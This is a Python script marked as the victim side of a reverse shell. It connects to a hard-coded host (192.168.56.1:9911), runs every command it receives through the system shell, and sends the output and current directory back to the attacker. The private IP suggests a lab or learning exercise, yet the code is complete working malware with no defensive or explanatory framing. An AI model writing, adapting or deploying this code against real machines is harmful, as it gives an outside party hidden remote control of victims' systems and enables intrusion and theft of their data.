# @ victim
import socket
import os
import subprocess

s = socket.socket()     # Create the socket
host = '192.168.56.1'  # Server IP address
port = 9911

s.connect((host, port))

while True:
    data = s.recv(1024)     # Receive 1024 bytes
    if data[:2].decode("utf-8") == 'cd':    # Exception: command 'cd' doesn't return any value
        os.chdir(data[3:].decode("utf-8"))  # change the directory to path stated from 3rd byte

    if len(data) > 0:
        # open the cmd
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()     # fill the output variable with stdout and stderr
        output_str = str(output_byte,"utf-8")       # Decode the output byte into string with "utf-8" decoding..
        currentWD = os.getcwd() + "> "      # get the current working directory and ">" to display at attacker.
        s.send(str.encode(output_str + currentWD))  # send both output str and the current working directory.

        print(output_str)